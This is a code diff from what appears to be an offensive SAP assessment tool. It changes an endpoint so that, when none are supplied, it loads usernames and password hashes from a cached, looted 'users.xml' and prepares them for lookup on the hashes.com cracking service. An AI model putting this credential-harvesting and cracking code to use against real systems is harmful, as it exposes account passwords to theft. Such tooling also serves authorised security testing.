@@ -2259,9 +2259,28 @@ def create_app(api: SAPMAPApi) -> Bottle:
         api_key = data.get("api_key") or _get_local_setting("hashes_com_api_key")
         if not api_key:
             return json.dumps({"error": "No hashes.com API key — set it in Settings"})
-        hashes_input = data.get("hashes") or []  # [{username, hash_hex, algorithm, hashcat_line}]
+        hashes_input = data.get("hashes") or []
+        # Script path: no modal, no hashes in payload — re-parse from cached users.xml
+        if not hashes_input and sn.users_xml_loot_path:
+            try:
+                from sapmap_scc_keystore import parse_user_hashes_from_xml
+                with open(sn.users_xml_loot_path, "rb") as _fh:
+                    _xml = _fh.read()
+                _parsed = parse_user_hashes_from_xml(_xml)
+                hashes_input = [
+                    {"username": u["username"],
+                     "hash_hex": u["hash_hex"],
+                     "algorithm": u.get("algorithm", ""),
+                     "hashcat_line": u.get("hashcat_line", "")}
+                    for u in (_parsed.get("users") or [])
+                    if u.get("hash_hex")
+                ]
+                print(f"[*] SCC {host}: lookup_hashes — loaded "
+                      f"{len(hashes_input)} hash(es) from cached users.xml")
+            except Exception as _he:
+                print(f"[-] SCC {host}: lookup_hashes — cache load error: {_he}")
         if not hashes_input:
-            return json.dumps({"error": "No hashes provided"})
+            return json.dumps({"error": "No hashes provided — run scc_download_hashes first"})
 
         import urllib.request as _urlreq2
         import urllib.parse as _urlparse
